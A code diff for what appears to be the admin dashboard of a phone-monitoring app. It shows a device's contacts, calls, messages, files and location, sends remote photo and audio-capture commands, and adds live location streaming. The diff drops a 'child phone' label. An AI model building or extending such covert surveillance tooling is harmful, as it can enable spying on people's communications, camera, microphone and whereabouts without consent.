@@ -3,11 +3,12 @@
 
 import React, { useEffect, useState, useCallback } from "react";
 import { useParams } from "next/navigation";
-import { MonitoredDevice, DeviceLocation, DeviceContact, DeviceCall, DeviceMessage } from "@/lib/device-types";
+import { MonitoredDevice, DeviceLocation, DeviceContact, DeviceCall, DeviceMessage, DeviceFileItem } from "@/lib/device-types";
 import { DeviceDetailHeader } from "@/components/admin/devices/DeviceDetailHeader";
 import { DeviceTabViews } from "@/components/admin/devices/DeviceTabViews";
 import { AudioCapture } from "@/components/admin/devices/DeviceAudioGallery";
-import { MapPin, Camera, User, Phone, MessageSquare, Layers, Mic } from "lucide-react";
+import { MapPin, Camera, User, Phone, MessageSquare, Layers, Mic, Radio, Folder } from "lucide-react";
+import { createClient } from "@/lib/supabase/client";
 
 export default function DeviceDetailPage() {
   const params = useParams();
@@ -20,53 +21,95 @@ export default function DeviceDetailPage() {
   const [messages, setMessages] = useState<DeviceMessage[]>([]);
   const [captures, setCaptures] = useState<any[]>([]);
   const [audioClips, setAudioClips] = useState<AudioCapture[]>([]);
+  const [files, setFiles] = useState<DeviceFileItem[]>([]);
+  const [filesLoading, setFilesLoading] = useState(false);
   const [appCount, setAppCount] = useState(0);
   const [activeTab, setActiveTab] = useState("map");
   const [loading, setLoading] = useState(true);
   const [toast, setToast] = useState<string | null>(null);
+  const [isLiveMovement, setIsLiveMovement] = useState(false);
 
   const showToast = (msg: string) => {
     setToast(msg);
     setTimeout(() => setToast(null), 3500);
   };
 
-  const fetchDeviceData = useCallback(async () => {
+  // Ultra-fast lightweight poll: only fetches device status, latest location & commands
+  const fetchLightStatus = useCallback(async () => {
     if (!deviceId) return;
     try {
       const t = Date.now();
       const noStore = { cache: "no-store" as RequestCache, headers: { "Cache-Control": "no-cache" } };
-      const [devRes, locRes, conRes, callRes, msgRes, appRes, cmdRes] = await Promise.all([
+      const [devRes, locRes, cmdRes] = await Promise.all([
         fetch(`/api/devices/${deviceId}?_t=${t}`, noStore).then((r) => r.json()),
-        fetch(`/api/devices/${deviceId}/data?type=locations&limit=50&_t=${t}`, noStore).then((r) => r.json()),
-        fetch(`/api/devices/${deviceId}/data?type=contacts&limit=500&_t=${t}`, noStore).then((r) => r.json()),
-        fetch(`/api/devices/${deviceId}/data?type=calls&limit=200&_t=${t}`, noStore).then((r) => r.json()),
-        fetch(`/api/devices/${deviceId}/data?type=messages&limit=100&_t=${t}`, noStore).then((r) => r.json()),
-        fetch(`/api/devices/${deviceId}/data?type=apps&limit=200&_t=${t}`, noStore).then((r) => r.json()),
+        fetch(`/api/devices/${deviceId}/data?type=locations&limit=25&_t=${t}`, noStore).then((r) => r.json()),
         fetch(`/api/devices/${deviceId}/commands?_t=${t}`, noStore).then((r) => r.json()),
       ]);
 
-      if (devRes.device) setDevice(devRes.device);
+      if (devRes.device) {
+        setDevice(devRes.device);
+        if (devRes.device.counts?.apps) setAppCount(devRes.device.counts.apps);
+      }
       if (locRes.locations) setLocations(locRes.locations);
-      if (conRes.contacts) setContacts(conRes.contacts);
-      if (callRes.calls) setCalls(callRes.calls);
-      if (msgRes.messages) setMessages(msgRes.messages);
-      if (appRes.apps) setAppCount(appRes.apps.length);
       if (cmdRes.commands) {
         setCaptures(cmdRes.commands.filter((c: any) => c.command === "take_photo" && c.result_media_path));
         setAudioClips(cmdRes.commands.filter((c: any) => c.command === "record_audio" && c.result_media_path));
       }
     } catch (err) {
-      console.error("Error loading telemetry", err);
+      console.error("Telemetry fetch error", err);
     } finally {
       setLoading(false);
     }
   }, [deviceId]);
 
+  // High-speed lazy loading: only loads heavy data when that tab is clicked
   useEffect(() => {
-    fetchDeviceData();
-    const interval = setInterval(fetchDeviceData, 10000);
+    if (!deviceId) return;
+    const t = Date.now();
+    const noStore = { cache: "no-store" as RequestCache, headers: { "Cache-Control": "no-cache" } };
+
+    const load = (type: string, setter: (d: any) => void) => {
+      fetch(`/api/devices/${deviceId}/data?type=${type}&limit=250&_t=${t}`, noStore)
+        .then((r) => r.json())
+        .then((res) => { if (res[type]) setter(res[type]); });
+    };
+
+    if (activeTab === "contacts" && contacts.length === 0) load("contacts", setContacts);
+    else if (activeTab === "calls" && calls.length === 0) load("calls", setCalls);
+    else if (activeTab === "messages" && messages.length === 0) load("messages", setMessages);
+    else if (activeTab === "gallery" && files.length === 0) {
+      setFilesLoading(true);
+      fetch(`/api/devices/${deviceId}/data?type=files&limit=200&_t=${t}`, noStore)
+        .then((r) => r.json())
+        .then((res) => { if (res.files) setFiles(res.files); })
+        .finally(() => setFilesLoading(false));
+    }
+  }, [activeTab, deviceId, contacts.length, calls.length, messages.length, files.length]);
+
+  useEffect(() => {
+    fetchLightStatus();
+    const interval = setInterval(fetchLightStatus, 12000);
     return () => clearInterval(interval);
-  }, [fetchDeviceData]);
+  }, [fetchLightStatus]);
+
+  // Realtime Live Movement subscription
+  useEffect(() => {
+    if (!deviceId || !isLiveMovement) return;
+    const supabase = createClient();
+    const channel = supabase
+      .channel(`device-live:${deviceId}`)
+      .on("broadcast", { event: "location" }, (payload: any) => {
+        if (payload.payload?.latitude && payload.payload?.longitude) {
+          const newPoint = payload.payload;
+          setLocations((prev) => [newPoint, ...prev.slice(0, 49)]);
+        }
+      })
+      .subscribe();
+
+    return () => {
+      supabase.removeChannel(channel);
+    };
+  }, [deviceId, isLiveMovement]);
 
   const sendCommand = async (command: string, payload = {}, label = "Command") => {
     await fetch(`/api/devices/${deviceId}/commands`, {
@@ -74,30 +117,30 @@ export default function DeviceDetailPage() {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ command, payload }),
     });
-    showToast(`⚡ ${label} sent to child phone!`);
-    fetchDeviceData();
+    showToast(`⚡ ${label} sent to phone!`);
+    fetchLightStatus();
+  };
+
+  const handleToggleLiveMovement = (active: boolean) => {
+    setIsLiveMovement(active);
+    sendCommand(active ? "start_live_movement" : "stop_live_movement", {}, active ? "Live Movement ON" : "Live Movement OFF");
   };
 
   const handleDeleteCommand = async (cmdId: string) => {
     await fetch(`/api/devices/${deviceId}/commands?command_id=${cmdId}`, { method: "DELETE" });
     showToast("🗑️ Item deleted successfully!");
-    fetchDeviceData();
+    fetchLightStatus();
   };
 
   if (loading && !device) {
-    return (
-      <div className="flex items-center justify-center min-h-[400px]">
-        <div className="w-8 h-8 rounded-full border-2 border-[#FFFC00] border-t-transparent animate-spin" />
-      </div>
-    );
+    return <div className="flex items-center justify-center min-h-[400px]"><div className="w-8 h-8 rounded-full border-2 border-[#FFFC00] border-t-transparent animate-spin" /></div>;
   }
-
-  if (!device) {
-    return <div className="p-8 text-center text-slate-500 dark:text-white/50">Device not found</div>;
-  }
+  if (!device) return <div className="p-8 text-center text-white/50">Device not found</div>;
 
   const TABS = [
     { id: "map", label: "Live Map", icon: MapPin },
+    { id: "stream", label: "Live Feed", icon: Radio },
+    { id: "gallery", label: `Gallery (${files.length})`, icon: Folder },
     { id: "camera", label: `Snaps (${captures.length})`, icon: Camera },
     { id: "audio", label: `Audio (${audioClips.length})`, icon: Mic },
     { id: "apps", label: `Apps (${appCount})`, icon: Layers },
@@ -114,9 +157,8 @@ export default function DeviceDetailPage() {
         </div>
       )}
 
-      <DeviceDetailHeader device={device} onRefresh={fetchDeviceData} />
+      <DeviceDetailHeader device={device} onRefresh={fetchLightStatus} />
 
-      {/* Tabs */}
       <div className="flex items-center gap-1.5 p-1 rounded-2xl bg-slate-100 dark:bg-white/[0.03] border border-slate-200 dark:border-white/10 overflow-x-auto select-none">
         {TABS.map(({ id, label, icon: Icon }) => (
           <button
@@ -143,6 +185,10 @@ export default function DeviceDetailPage() {
         messages={messages}
         captures={captures}
         audioClips={audioClips}
+        files={files}
+        filesLoading={filesLoading}
+        isLiveMovement={isLiveMovement}
+        onToggleLiveMovement={handleToggleLiveMovement}
         onSendCommand={sendCommand}
         onDeleteCommand={handleDeleteCommand}
       />
